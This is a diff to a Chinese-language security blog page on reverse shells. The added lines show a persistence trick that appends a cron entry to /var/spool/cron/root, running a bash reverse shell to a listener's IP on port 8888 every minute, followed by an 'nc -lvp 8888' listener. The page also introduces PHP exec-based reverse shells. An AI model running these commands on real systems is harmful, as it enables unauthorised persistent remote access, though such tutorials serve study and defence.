@@ -468,8 +468,15 @@
 
 <p>然后<code>crontab -e</code>写入</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /etc/crontabshell</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
+<ol start="3">
+<li>写入到crontab定时任务所在位置<code>/var/spool/cron/root</code></li>
+</ol>
 </blockquote>
+<p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/监听该机器的ip/8888 0&gt;&amp;1&#39; &gt;&gt; /var/spool/cron/root</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/wOlGUE86IY3h5nx.png" alt="image-20211208190403710"></p>
+<p><code>nc -lvp 8888</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/lgsAU68iCHxk2M3.png" alt="image-20211208190249253"></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
 <h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
 <p>默认的php.ini文件中没有打开安全模式</p>
 <p>使用php的exec函数执行反弹shell的命令</p>
@@ -900,7 +907,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">39.4k</span>&nbsp;字
+                class="white-color">39.5k</span>&nbsp;字
             
             
             
